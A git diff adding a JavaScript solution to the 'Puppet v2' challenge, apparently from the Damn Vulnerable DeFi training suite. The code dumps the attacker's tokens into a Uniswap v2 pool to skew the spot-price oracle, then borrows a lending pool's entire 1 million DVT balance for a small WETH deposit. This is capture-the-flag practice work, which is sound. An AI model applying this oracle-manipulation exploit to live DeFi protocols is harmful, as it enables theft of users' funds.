@@ -82,6 +82,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Nothing special for this challenge compared to v1.
+        // Core concepts described in the Uniswap v2 doc are not respected:
+        // https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles
+
+        // swap all attacker tokens for WETH
+        tokenToSwap = ATTACKER_INITIAL_TOKEN_BALANCE;
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, tokenToSwap);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            tokenToSwap,                                                // amountIn
+            0,                                                          // amountOutMin
+            [this.token.address, this.weth.address],                    // path
+            attacker.address,                                           // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+
+        // convert almost all attacker ETH to WETH
+        await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther('19.9')});
+
+        const deposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Required deposit to take all tokens from pool: %s", ethers.utils.formatEther(deposit));
+        const balance = await this.weth.balanceOf(attacker.address);
+        console.log("Attacker WETH balance: ", ethers.utils.formatEther(balance));
+
+        // take 1 million DVT
+        await this.weth.connect(attacker).approve(this.lendingPool.address, deposit);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
